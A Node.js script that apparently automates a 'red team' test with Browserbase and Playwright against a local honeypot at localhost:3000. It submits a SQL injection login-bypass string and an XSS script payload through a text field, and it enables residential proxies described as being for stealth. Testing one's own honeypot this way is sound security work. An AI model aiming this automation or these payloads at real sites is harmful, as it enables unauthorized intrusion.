
import { Browserbase } from '@browserbasehq/sdk'
import { chromium } from 'playwright-core'

const BROWSERBASE_PROJECT_ID = process.env.BROWSERBASE_PROJECT_ID
const BROWSERBASE_API_KEY = process.env.BROWSERBASE_API_KEY

if (!BROWSERBASE_API_KEY) {
    console.error('❌ Missing Browserbase API Key. Please add it to .env.local')
    process.exit(1)
}

const bb = new Browserbase({
    apiKey: BROWSERBASE_API_KEY,
    projectId: BROWSERBASE_PROJECT_ID,
})

const TARGET_URL = 'http://localhost:3000'

async function runRedTeam() {
    console.log(`🔴 Red Team Agent launching via Browserbase...`)

    let session
    try {
        // 1. Create Session
        console.log("Creating Browserbase Session...")
        session = await bb.sessions.create({
            projectId: BROWSERBASE_PROJECT_ID,
            proxies: true // Enable residential proxies if needed, mostly for stealth
        })
        console.log(`✅ Session ID: ${session.id}`)
        console.log(`🔗 Live View: ${session.liveUrl}`) // Useful for the user to watch

        // 2. Connect Playwright
        console.log("Connecting Playwright...")
        const browser = await chromium.connectOverCDP(session.connectUrl)
        const context = browser.contexts()[0]
        const page = context.pages()[0] || await context.newPage()

        // 3. Navigate to Honeypot
        console.log(`Navigating to ${TARGET_URL}...`)
        await page.goto(TARGET_URL)

        // 4. Perform Attack (SQL Injection)
        console.log(" injecting payload: ADMIN' OR '1'='1' --")
        // Wait for input to be ready (targeting the input by placeholder or generic selector)
        await page.fill('input[type="text"]', "ADMIN' OR '1'='1' --")

        // Click Send (assuming button text is "SEND")
        await page.click('button:has-text("SEND")')

        console.log("Payload Sent. Waiting for response...")
        await page.waitForTimeout(3000) // Watch the result

        // 5. Verify Successful Breach (Honeypot Triggered)
        const content = await page.content()
        if (content.includes("ACCESS GRANTED") || content.includes("Welcome")) {
            console.log("✅ ATTACK SUCCESSFUL (Honeypot Triggered)")
        } else {
            console.log("⚠️ Attack result unclear (might be blocked or loading)")
        }

        // 6. XSS Attack (Bonus)
        console.log("Injecting XSS Payload...")
        await page.fill('input[type="text"]', "<script>alert('pwned')</script>")
        await page.click('button:has-text("SEND")')
        await page.waitForTimeout(2000)

        console.log("🔴 Red Team Mission Complete.")

        await browser.close()

    } catch (error) {
        console.error('Browserbase Error:', error)
    } finally {
        if (session) {
            // await bb.sessions.update(session.id, { status: 'COMPLETED' })
            console.log(`Session finished. View recording at: https://browserbase.com/sessions/${session.id}`)
        }
    }
}

runRedTeam()
